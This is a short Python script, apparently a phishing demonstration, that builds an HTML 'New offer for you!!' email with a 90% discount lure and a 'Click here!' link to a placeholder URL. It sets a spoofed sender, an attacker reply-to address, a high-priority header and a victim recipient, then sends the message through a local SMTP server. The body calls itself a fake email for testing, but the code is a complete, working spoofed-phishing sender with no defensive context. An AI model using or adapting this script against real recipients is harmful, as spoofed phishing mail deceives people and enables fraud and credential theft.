from email.mime.text import MIMEText
import smtplib
from email.message import EmailMessage
msg = EmailMessage()
email_body = """<p>Hello,</p><p>We just created a new offer for you!!</p><p><b>90% discount on all our products</b></p><p>Please check the following link for more information:</p><a href='https://thisisafakeurl.com'>Click here!</a>
<p>Enjoy!</p></br><p>This is a fake email for testing.</p>"""
msg = MIMEText(email_body,'html')
msg["Subject"] = "New offer for you!!"
msg['X-MSMail-Priority'] = 'High'
msg["To"] = "<VICTIM_EMAIL>"
msg["From"] = "<SPOOFED_EMAIL>"
msg.add_header("reply-to","<ATTACKER_EMAIL>")
s = smtplib.SMTP("localhost")
s.send_message(msg)
